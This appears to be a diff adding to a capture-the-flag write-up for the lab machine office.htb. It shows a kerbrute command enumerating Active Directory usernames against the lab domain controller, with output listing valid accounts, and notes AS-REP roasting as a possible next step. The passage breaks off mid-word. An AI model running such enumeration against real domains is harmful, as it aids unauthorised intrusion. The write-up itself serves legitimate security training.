@@ -268,5 +268,27 @@ Im thinking there could be password reuse
 # Finding valid usernames
 
 ```python
+kerbrute userenum --dc dc.office.htb -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
 
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 05/12/26 - Ronnie Flathers @ropnop
+
+2026/05/12 17:49:59 >  Using KDC(s):
+2026/05/12 17:49:59 >  	dc.office.htb:88
+
+2026/05/12 17:50:02 >  [+] VALID USERNAME:	 administrator@office.htb
+2026/05/12 17:50:24 >  [+] VALID USERNAME:	 Administrator@office.htb
+2026/05/12 17:50:35 >  [+] VALID USERNAME:	 etower@office.htb
+2026/05/12 17:50:35 >  [+] VALID USERNAME:	 ewhite@office.htb
+2026/05/12 17:50:35 >  [+] VALID USERNAME:	 dwolfe@office.htb
+2026/05/12 17:50:35 >  [+] VALID USERNAME:	 dlanor@office.htb
+2026/05/12 17:50:35 >  [+] VALID USERNAME:	 dmichael@office.htb
 ```
+Found some valid usernames
+
+I can try some things like AS-REP roasting, but likel
